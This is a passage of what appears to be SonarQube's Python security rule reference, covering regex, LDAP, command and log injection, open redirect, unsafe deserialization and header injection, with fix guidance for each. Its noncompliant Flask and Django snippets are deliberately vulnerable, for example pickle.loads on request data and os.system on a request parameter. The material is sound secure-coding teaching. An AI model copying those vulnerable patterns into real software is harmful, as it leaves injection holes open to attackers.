          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S2631">
              pythonsecurity:S2631
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Regular expression injections occur when the application retrieves untrusted data and uses it as a regex to pattern match a string with it.</p>
<p>Most regular expression search engines use <em>backtracking</em> to try all possible regex execution paths when evaluating an input. Sometimes this
can lead to performance problems also referred to as <em>catastrophic backtracking</em> situations.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application vulnerable to regex injection:<br /> After discovering the injection point, attackers insert data into the
vulnerable field to make the affected component inaccessible.</p>
<p>Depending on the application’s software architecture and the injection point’s location, the impact may or may not be visible.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Self Denial of Service</h4>
<p>In cases where the complexity of the regular expression is exponential to the input size, a small, carefully-crafted input (for example, 20 chars)
can trigger <em>catastrophic backtracking</em> and cause a denial of service of the application.</p>
<p>Super-linear regex complexity can produce the same effects for a large, carefully crafted input (thousands of chars).</p>
<p>If the component jeopardized by this vulnerability is not a bottleneck that acts as a single point of failure (SPOF) within the application, the
denial of service might only affect the attacker who initiated it.</p>
<p>Such benign denial of service can also occur in architectures that rely heavily on containers and container orchestrators. Replication systems
would detect the failure of a container and automatically replace it.</p>
<h4>Infrastructure SPOFs</h4>
<p>However, a denial of service attack can be critical to the enterprise if it targets a SPOF component. Sometimes the SPOF is a software architecture
vulnerability (such as a single component on which multiple critical components depend) or an operational vulnerability (for example, insufficient
container creation capabilities or failures from containers to terminate).</p>
<p>In either case, attackers aim to exploit the infrastructure weakness by sending as many malicious payloads as possible, using potentially huge
offensive infrastructures.</p>
<p>These threats are particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h2>How to fix it in Python Standard Library</h2>
<h3>Code examples</h3>
<p>The following noncompliant code is vulnerable to Regex Denial of Service (ReDoS) because untrusted data is used as a regex to scan a string without
prior sanitization or validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from flask import request
import re

&#64;app.route(&#39;/lookup&#39;)
def lookup():
  regex &#61; request.args[&#39;regex&#39;]
  data &#61; request.args[&#39;data&#39;]

  re.search(regex, data) # Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
from flask import request
import re

&#64;app.route(&#39;/lookup&#39;)
def lookup():
  regex &#61; request.args[&#39;regex&#39;]
  data &#61; request.args[&#39;data&#39;]

  re.search(re.escape(regex), data)
</pre>
<h3>How does this work?</h3>
<h4>Sanitization and Validation</h4>
<p>Metacharacters escape using native functions is a solution against regex injection.<br /> The escape function sanitizes the input so that the regular
expression engine interprets these characters literally.</p>
<p>An allowlist approach can also be used by creating a list containing authorized and secure strings you want the application to use in a query.<br />
If a user input does not match an entry in this list, it should be considered unsafe and rejected.</p>
<p><strong>Important Note</strong>: The application must sanitize and validate on the server side. Not on client-side front end.</p>
<p>Where possible, use <em>non-backtracking</em> regex engines, for example, Google’s <a href="https://github.com/google/re2" rel="nofollow">re2</a>.</p>
<p>In the compliant solution, <code>re.escape</code> escapes metacharacters and escape sequences that could have broken the initially intended
logic.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS" rel="nofollow">OWASP Regular expression Denial of Service - ReDoS</a>
  </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/400" rel="nofollow">MITRE, CWE-400</a> - Uncontrolled Resource Consumption </li><li> <a href="https://cwe.mitre.org/data/definitions/1333" rel="nofollow">MITRE, CWE-1333</a> - Inefficient Regular Expression Complexity </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S2078">
              pythonsecurity:S2078
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>LDAP injections occur in an application when the application retrieves untrusted data and inserts it into an LDAP query without sanitizing it
first.</p>
<p>An LDAP injection can either be basic or blind, depending on whether the server’s fetched data is directly returned in the web application’s
response.<br /> The absence of the corresponding response for the malicious request on the application is not a barrier to exploitation. Thus, it must
be treated the same way as basic LDAP injections.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application vulnerable to LDAP injection: after discovering the injection point, attackers insert data into the vulnerable
field to execute malicious LDAP commands.</p>
<p>The impact of this vulnerability depends on how vital LDAP servers are to the organization.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Data leakage or corruption</h4>
<p>In typical scenarios where systems perform innocuous LDAP operations to find users or create inventories, an LDAP injection could result in data
leakage or corruption.</p>
<h4>Privilege escalation</h4>
<p>A malicious LDAP query could allow an attacker to impersonate a low-privileged user or an administrator in scenarios where systems perform
authorization checks or authentication.</p>
<p>Attackers use this vulnerability to find multiple footholds on target organizations by gathering authentication bypasses.</p>
<h2>How to fix it in python-ldap</h2>
<h3>Code examples</h3>
<p>The following noncompliant code is vulnerable to LDAP injection because untrusted data is concatenated to an LDAP query without prior sanitization
or validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from flask import request
import ldap

&#64;app.route(&#34;/user&#34;)
def user():
    username &#61;  request.args[&#39;username&#39;]

    search_filter &#61; &#34;(&amp;(objectClass&#61;user)(uid&#61;&#34;&#43;username&#43;&#34;))&#34;

    ldap_connection &#61; ldap.initialize(&#34;ldap://localhost:389&#34;)
    user &#61; ldap_connection.search_s(&#34;dc&#61;example,dc&#61;org&#34;, ldap.SCOPE_SUBTREE, search_filter) # Noncompliant

    return user[0]
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
from flask import request
import ldap

&#64;app.route(&#34;/user&#34;)
def user():
    username &#61; ldap.filter.escape_filter_chars(request.args[&#39;username&#39;])

    search_filter &#61; &#34;(&amp;(objectClass&#61;user)(uid&#61;&#34;&#43;username&#43;&#34;))&#34;

    ldap_connection &#61; ldap.initialize(&#34;ldap://localhost:389&#34;)
    user &#61; ldap_connection.search_s(&#34;dc&#61;example,dc&#61;org&#34;, ldap.SCOPE_SUBTREE, search_filter)

    return user[0]
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of the
initially intended logic.</p>
<p>For LDAP injection, the cleanest way to do so is to use parameterized queries if it is available for your use case.</p>
<p>Another approach is to sanitize the input before using it in an LDAP query. Input sanitization should be primarily done using native libraries.</p>
<p>Alternatively, validation can be implemented using an allowlist approach by creating a list of authorized and secure strings you want the
application to use in a query. If a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>
<p><strong>Important note</strong>: The application must sanitize and validate on the server-side. Not on client-side front-ends.</p>
<p>The most fundamental security mechanism is the restriction of LDAP metacharacters.</p>
<p>For <strong>Distinguished Names</strong> (DN), special characters that need to be escaped include:</p>
<ul><li> <code>\</code> </li><li> <code>#</code> </li><li> <code>&#43;</code> </li><li> <code>&lt;</code> </li><li> <code>&gt;</code> </li><li> <code>,</code> </li><li> <code>;</code> </li><li> <code>&#34;</code> </li><li> <code>&#61;</code> </li></ul>
<p>For <strong>Search Filters</strong>, special characters that need to be escaped include:</p>
<ul><li> <code>*</code> </li><li> <code>(</code> </li><li> <code>)</code> </li><li> <code>\</code> </li><li> <code>null</code> </li></ul>
<p>For Python, the python-ldap library functions <a href="https://www.python-ldap.org/en/python-ldap-3.3.0/reference/ldap-filter.html" rel="nofollow"><code>escape_filter_chars</code></a> and <a href="https://www.python-ldap.org/en/python-ldap-3.3.0/reference/ldap-dn.html?highlight&#61;escape_dn#ldap.dn.escape_dn_chars" rel="nofollow"><code>escape_dn_chars</code></a>
allow sanitizing these characters.</p>
<p>In the compliant solution example, the <code>escape_filter_chars</code> is used to sanitize the search filter concatenated input.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://www.ietf.org/rfc/rfc4514.txt" rel="nofollow">RFC 4514</a> - LDAP: String Representation of Distinguished Names </li><li> <a href="https://www.ietf.org/rfc/rfc4515.txt" rel="nofollow">RFC 4515</a> - LDAP: String Representation of Search Filters </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/90" rel="nofollow">MITRE, CWE-90</a> - Improper Neutralization of Special Elements used in an LDAP Query
  (&#39;LDAP Injection&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S5146">
              pythonsecurity:S5146
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Open redirection occurs when an application uses user-controllable data to redirect users to a URL.</p>
<p>An attacker with malicious intent could manipulate a user to browse into a specially crafted URL, such as
<code>https://trusted.example.com?url&#61;evil.example.com</code>, to redirect the victim to his evil domain.</p>
<p>Tricking users into sending the malicious HTTP request is usually the main task of exploiting an open redirection. Often, it requires an attacker
to build a credible pretext to prevent suspicions from the victim.<br /></p>
<p>Attackers commonly use open redirect exploits in mass phishing campaigns.</p>
<h3>What is the potential impact?</h3>
<p>If an attacker tricks a user into opening a link of his choice, the user is redirected to a domain controlled by the attacker.</p>
<p>From then on, the attacker can perform various malicious actions, some more impactful than others.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Domain Mirroring</h4>
<p>A malicious link redirects to an attacker’s controlled website mirroring the interface of a web application trusted by the user. Due to the
similarity in the application appearance and the apparently trustable clicked hyperlink, the user struggles to identify that they are browsing on a
malicious domain.<br /></p>
<p>Depending on the attacker’s purpose, the malicious website can leak credentials, bypass Multi-Factor Authentication (MFA), and reach any
authenticated data or action.</p>
<h4>Malware Distribution</h4>
<p>A malicious link redirects to an attacker’s controlled website that serves malware. On the same basis as the domain mirroring exploitation, the
attacker develops a spearphishing or phishing campaign with a carefully crafted pretext that would result in the download and potential execution of a
hosted malicious file.<br /> The worst-case scenario could result in complete system compromise.</p>
<h2>How to fix it in Flask</h2>
<h3>Code examples</h3>
<p>The following noncompliant code example is vulnerable to open redirection as it constructs a URL with user-controllable data. This URL is then used
to redirect the user without being first validated. An attacker can leverage this to manipulate users into performing unwanted redirects.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from flask import Flask, redirect

app &#61; Flask(&#34;example&#34;)

&#64;app.route(&#34;/redirecting&#34;)
def redirecting():
    url &#61; request.args[&#34;url&#34;]
    return redirect(url) # Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
from flask import Flask, redirect, url_for

app &#61; Flask(&#34;example&#34;)

&#64;app.route(&#34;/redirecting&#34;)
def redirecting():
    url &#61; request.args[&#34;url&#34;]
    return redirect(url_for(url))
</pre>
<h3>How does this work?</h3>
<p>Built-in framework methods should be preferred as, more often than not, these provide additional security mechanisms. Usually, these built-in
methods are engineered for internal page redirections. Thus, they might not be the solution for the reader’s use case.</p>
<p>In case the application strictly requires external redirections based on user-controllable data, this could be done using the following
alternatives:</p>
<ol><li> Validating the <code>authority</code> part of the URL against a statically defined value (see Pitfalls). </li><li> Using an allow-list approach in case the destination URLs are multiple but limited. </li><li> Adding a customized page to which users are redirected, warning about the imminent action and requiring manual authorization to proceed. </li></ol>
<h3>Pitfalls</h3>
<h4>The trap of &#39;StartsWith&#39; and equivalents</h4>
<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure
that the validation string contains a path separator <code>/</code> as the last character</strong>.<br /></p>
<p>If the validation string does not contain a terminating path separator, the Open Redirect vulnerability remains; only the exploitation technique
changes.</p>
<p>Thus, a validation like <code>startsWith(&#34;https://example.com&#34;)</code> or an equivalent with the regex <code>^https://example\.com.*</code> can be
exploited with the following URL <code>https://example.com.malicious.io</code>. The practice of taking over domains that maliciously look like
existing domains is widespread and is called <a href="https://en.wikipedia.org/wiki/Cybersquatting" rel="nofollow">Cybersquatting</a>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/601" rel="nofollow">MITRE, CWE-601</a> - URL Redirection to Untrusted Site (&#39;Open Redirect&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S5135">
              pythonsecurity:S5135
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Deserialization injections occur when applications deserialize wholly or partially untrusted data without verification.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application performing unsafe deserialization:<br /> After detecting the injection vector, attackers inject a
carefully-crafted payload into the application.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Application-specific attacks</h4>
<p>In this scenario, the attackers succeed in injecting an object of the expected class, but with malicious properties that affect the object’s
behavior.</p>
<p>If the application relies on the properties of the deserialized object, attackers can modify the data structure or content to escalate privileges
or perform unwanted actions.<br /> In the context of an e-commerce application, this could be changing the number of products or prices.</p>
<h4>Full application compromise</h4>
<p>In the worst-case scenario, the attackers succeed in injecting an object of a completely different class than expected, triggering code
execution.</p>
<p>Depending on the attacker, code execution can be used with different intentions:</p>
<ul><li> Download the internal server’s data, most likely to sell it. </li><li> Modify data, install malware, for instance, malware that mines cryptocurrencies. </li><li> Stop services or exhaust resources, for instance, with fork bombs. </li></ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a Disaster Recovery Plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker additionally manages to
elevate his privileges as an administrator and attack other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
through a combination of unsafe deserialization and misconfiguration:</p>
<ul><li> Docker or Kubernetes clusters </li><li> cloud services </li><li> network firewalls and routing </li><li> OS access control </li></ul>
<h2>How to fix it in Python Standard Library</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to deserialization attacks because it deserializes HTTP data without validating it first.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
def unsafe():
    objstr &#61; b64decode(request.args.get(&#34;object&#34;))
    obj &#61; pickle.loads(objstr)
    return str(obj.status &#61;&#61; &#34;OK&#34;)
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
def safe():
    obj &#61; json.loads(request.args.get(&#34;object&#34;))
    return str(obj[&#34;status&#34;] &#61;&#61; &#34;OK&#34;)
</pre>
<h3>How does this work?</h3>
<p>Allowing users to provide data for deserialization generally creates more problems than it solves.</p>
<p>Anything that can be done through deserialization can generally be done with more secure data structures.<br /> Therefore, our first suggestion is to
avoid deserialization in the first place.</p>
<p>However, if deserialization mechanisms are valid in your context, here are some security suggestions.</p>
<h4>More secure serialization methods</h4>
<p>Some more secure serialization methods reduce the risk of security breaches, although not definitively.</p>
<p>A complete object serializer is probably unnecessary if you only need to receive primitive data (for example integers, strings, bools, etc.).<br />
In this case, formats such as JSON and XML protect the application from deserialization attacks by default.</p>
<p>For more complex objects, the next step is to control which class fields are exposed by creating class-specific serialization methods.<br /> The most
common method is to use Data Transfer Objects (DTO) patterns or Google Protocol Buffers (protobufs). After creating the Protobuf data structure, the
Protobuf compiler creates class files that handle operations such as serializing and deserializing data.</p>
<h4>Integrity check</h4>
<p>Message authentication codes (MAC) can be used to prevent tampering with serialized data that is meant to be stored outside the application
server:</p>
<ul><li> On the server-side, when serializing an object, compute a MAC of the result and append it to the serialized object string. </li><li> When the serialized value is submitted back, verify the serialization string MAC on the server side before deserialization. </li></ul>
<p>Depending on the situation, two MAC computation modes can be used.</p>
<p>If the same application will be responsible for the MAC computing and validation, a symmetric signature algorithm can be used. In that case, HMAC
should be preferred, with a strong underlying hash algorithm such as SHA-256.</p>
<p>If multiple parties have to validate the serialized data, an asymetric signature algorithm should be used. This will reduce the chances for a
signing secret to be leaked. In that case, the <code>RSASSA-PSS</code> algorithm can be used.</p>
<p><strong>Note</strong>: Be sure to store the signing secret securely.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/" rel="nofollow">OWASP Top 10 2021 Category A8</a> - Software and Data
  Integrity Failures </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization" rel="nofollow">OWASP Top 10 2017 Category A8</a> - Insecure Deserialization
  </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/502" rel="nofollow">MITRE, CWE-502</a> - Deserialization of Untrusted Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S5145">
              pythonsecurity:S5145
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Log injection occurs when an application fails to sanitize untrusted data used for logging.</p>
<p>An attacker can forge log content to prevent an organization from being able to trace back malicious activities.</p>
<h3>What is the potential impact?</h3>
<p>If an attacker can insert arbitrary data into a log file, the integrity of the chain of events being recorded can be compromised.<br /> This
frequently occurs because attackers can inject the log entry separator of the logger framework, commonly newlines, and thus insert artificial log
entries. <br /> Other attacks could also occur requiring only field pollution, such as cross-site scripting (XSS) or code injection (for example,
Log4Shell) if the logged data is fed to other application components, which may interpret the injected data differently.<br /></p>
<p>The focus of this rule is newline character replacement.</p>
<h4>Log Forge</h4>
<p>An attacker, able to create independent log entries by injecting log entry separators, inserts bogus data into a log file to conceal his malicious
activities. This obscures the content for an incident response team to trace the origin of the breach as the indicators of compromise (IoCs) lead to
fake application events.</p>
<h2>How to fix it in Flask</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to log injection as it constructs log entries using untrusted data. An attacker can leverage this to manipulate
the chain of events being recorded.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import logging

app &#61; Flask(__name__)

&#64;app.route(&#39;/example&#39;)
def log():
    data &#61; request.args[&#34;data&#34;]
    app.logger.critical(&#34;%s&#34;, data) # Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import logging
import base64

app &#61; Flask(__name__)

&#64;app.route(&#39;/example&#39;)
def log():
    data &#61; request.args[&#34;data&#34;]
    if data.isalnum():
        app.logger.critical(&#34;%s&#34;, data)
    else:
        app.logger.critical(&#34;Invalid Input: %s&#34;, base64.b64encode(data.encode(&#39;UTF-8&#39;)))
</pre>
<h3>How does this work?</h3>
<p>Data used for logging should be content-restricted and typed. This can be done by validating the data content or sanitizing it.<br /> Validation and
sanitization mainly revolve around preventing carriage return (CR) and line feed (LF) characters. However, further actions could be required based on
the application context and the logged data usage.</p>
<p>Here, the example compliant code uses the <code>isalnum</code> function to ensure the untrusted data is safe. If not, it performs Base64 encoding
to protect from log injection.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/" rel="nofollow">OWASP Top 10 2021 Category A9</a> - Security Logging and
  Monitoring Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring" rel="nofollow">OWASP Top 10 2017 Category A10</a> -
  Insufficient Logging &amp; Monitoring </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/117" rel="nofollow">MITRE, CWE-117</a> - Improper Output Neutralization for Logs </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S5167">
              pythonsecurity:S5167
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/sopra-steria/rules?open&#61;python%3AS5122&amp;rule_key&#61;python%3AS5122" rel="nofollow">S5122</a>, <a href="/organizations/sopra-steria/rules?open&#61;python%3AS5146&amp;rule_key&#61;python%3AS5146" rel="nofollow">S5146</a>, <a href="/organizations/sopra-steria/rules?open&#61;python%3AS6287&amp;rule_key&#61;python%3AS6287" rel="nofollow">S6287</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>User-provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Applications
constructing HTTP response headers based on tainted data could allow attackers to change security sensitive headers like Cross-Origin Resource Sharing
headers.</p>
<p>Web application frameworks and servers might also allow attackers to inject new line characters in headers to craft malformed HTTP response. In
this case the application would be vulnerable to a larger range of attacks like HTTP Response Splitting/Smuggling. Most of the time this type of
attack is mitigated by default modern web application frameworks but there might be rare cases where older versions are still vulnerable.</p>
<p>As a best practice, applications that use user-provided data to construct the response header should always validate the data first. Validation
should be based on a whitelist.</p>
<h3>Noncompliant code example</h3>
<p>Flask</p>
<pre>
from flask import Response, request
from werkzeug.datastructures import Headers

&#64;app.route(&#39;/route&#39;)
def route():
    content_type &#61; request.args[&#34;Content-Type&#34;]
    response &#61; Response()
    headers &#61; Headers()
    headers.add(&#34;Content-Type&#34;, content_type) # Noncompliant
    response.headers &#61; headers
    return response
</pre>
<p>Django</p>
<pre>
import django.http

def route(request):
    content_type &#61; request.GET.get(&#34;Content-Type&#34;)
    response &#61; django.http.HttpResponse()
    response.__setitem__(&#39;Content-Type&#39;, content_type) # Noncompliant
    return response
</pre>
<h3>Compliant solution</h3>
<p>Flask</p>
<pre>
from flask import Response, request
from werkzeug.datastructures import Headers
import re

&#64;app.route(&#39;/route&#39;)
def route():
    content_type &#61; request.args[&#34;Content-Type&#34;]
    allowed_content_types &#61; r&#39;application/(pdf|json|xml)&#39;
    response &#61; Response()
    headers &#61; Headers()
    if re.match(allowed_content_types, content_type):
        headers.add(&#34;Content-Type&#34;, content_type)  # Compliant
    else:
        headers.add(&#34;Content-Type&#34;, &#34;application/json&#34;)
    response.headers &#61; headers
    return response
</pre>
<p>Django</p>
<pre>
import django.http
import re

def route(request):
    content_type &#61; request.GET.get(&#34;Content-Type&#34;)
    allowed_content_types &#61; r&#39;application/(pdf|json|xml)&#39;
    response &#61; django.http.HttpResponse()
    if re.match(allowed_content_types, content_type):
        response.__setitem__(&#39;Content-Type&#39;, content_type) # Compliant
    else:
        response.__setitem__(&#39;Content-Type&#39;, &#34;application/json&#34;)
    return response
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/HTTP_Response_Splitting" rel="nofollow">OWASP Attack Category</a> - HTTP Response Splitting </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/113" rel="nofollow">MITRE, CWE-113</a> - Improper Neutralization of CRLF Sequences in HTTP Headers (&#39;HTTP
  Response Splitting&#39;) </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S2076">
              pythonsecurity:S2076
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>OS command injections occur when applications build command lines from untrusted data before executing them with a system shell.<br /> In that case,
an attacker can tamper with the command line construction and force the execution of unexpected commands. This can lead to the compromise of the
underlying operating system.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting an OS command injection vulnerability will be able to execute arbitrary commands on the underlying operating system.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,
and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul><li> download the internal server’s data, most likely to sell it </li><li> modify data, send malware </li><li> stop services or exhaust resources (with fork bombs for example) </li></ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of OS injections and <strong>misconfiguration</strong> of:</p>
<ul><li> Docker or Kubernetes clusters </li><li> cloud services </li><li> network firewalls and routing </li><li> OS access control </li></ul>
<h2>How to fix it in Python Standard Library</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to command injections because it is using untrusted inputs to set up a new process. Therefore an attacker can
execute an arbitrary program that is installed on the system.</p>
<p>Especially, in this example, if the <strong>host</strong> request parameter contains system shell control characters, the expected
<code>ping</code> command behavior will be changed.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
def ping():
    cmd &#61; &#34;ping -c 1 %s&#34; % request.args.get(&#34;host&#34;, &#34;www.google.com&#34;)
    status &#61; os.system(cmd) # Noncompliant
    return str(status &#61;&#61; 0)
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
def safe_ping():
    host &#61; request.args.get(&#34;host&#34;, &#34;www.google.com&#34;)
    status &#61; subprocess.run([&#34;ping&#34;, &#34;-c&#34;, &#34;1&#34;, &#34;--&#34;, host]).returncode
    return str(status &#61;&#61; 0)
</pre>
<h3>How does this work?</h3>
<p>Allowing users to execute operating system commands generally creates more problems than it solves.</p>
<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br /> Therefore, our first suggestion is to
avoid using OS commands in the first place.<br /> However, if the application requires running OS commands with user-controlled data, here are some
security suggestions.</p>
<h4>Pre-Approved commands</h4>
<p>If the application aims to execute only a small number of OS commands (for example, <code>ls</code>, <code>pwd</code>, and <code>grep</code>), the
cleanest way to avoid this problem is to validate the input before using it in an OS command.</p>
<p>Create a list of authorized and secure commands that you want the application to be able to execute. Use absolute paths to avoid any ambiguity.<br />
If a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>
<p>Depending on the number of commands you want the application to support, the list can be either a regex string or any array type. If you use
regexes, choose simple regexes to avoid ReDOS attacks. For example, you can accept only a specific set of executables, by using
<code>^/bin/(ls|pwd|grep)$</code>.</p>
<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>
<h4>Neutralize special characters</h4>
<p>If the application is to execute complex commands that cannot be controlled thanks to pre-approved lists, the cleanest approach is to use special
sanitization components, such as <code>subprocess</code>.</p>
<p>The library helps you to get rid of common dangerous characters, such as:</p>
<ul><li> <code>&amp;</code> </li><li> <code>|</code> </li><li> <code>;</code> </li><li> <code>$</code> </li><li> <code>&gt;</code> </li><li> <code>&lt;</code> </li><li> <code>\&#96;</code> </li><li> <code>\\</code> </li><li> <code>!</code> </li></ul>
<p>If user input is to be included in the arguments of a command, the application must ensure that dangerous options or argument delimiters are
neutralized.<br /> Argument delimiters count <code>&#39;</code>, <code>-</code> and spaces.</p>
<p>For example, the <code>find</code> command from UNIX supports the dangerous argument <code>-exec</code>.<br /> In this case, option processing can be
terminated with a string containing <code>--</code> or with special options. For example, <code>git</code> supports <code>--end-of-options</code> <a href="https://github.blog/2019-11-03-highlights-from-git-2-24/#tidbits" rel="nofollow">since its version 2.24</a>.</p>
<p>In the example compliant code, using the <code>subprocess.run</code> function helps to escape the passed arguments. It accepts a list of command
arguments that will be properly escaped and concatenated to form the command line to execute.</p>
<h4>Disable shell integration</h4>
<p>In most cases, command execution libraries propose two ways to execute external program: with or without shell integration.</p>
<p>When shell integration is allowed, an attacker with control over the command arguments can simply execute additional external programs using system
shell features. For example, on Unix, command pipelining (<code>|</code>) or string interpolation (<code>$()</code>, <code>&lt;()</code>, etc.) can be
